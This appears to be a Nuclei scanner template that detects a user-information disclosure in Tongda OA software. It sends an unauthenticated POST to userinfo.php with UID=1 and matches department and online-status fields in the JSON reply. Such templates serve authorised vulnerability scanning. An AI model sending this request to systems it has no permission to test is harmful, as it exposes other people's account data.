id: tongda-session-disclosure
info:
  author: ritikchaddha
  name: Tongda User Session Disclosure
  reference:
  - https://mp.weixin.qq.com/s/llyGEBRo0t-C7xOLMDYfFQ
  severity: medium
  tags: tongda,disclosure
requests:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"dept_name":"'
    - '"online_flag":'
  - condition: and
    part: header
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/general/userinfo.php?UID=1'
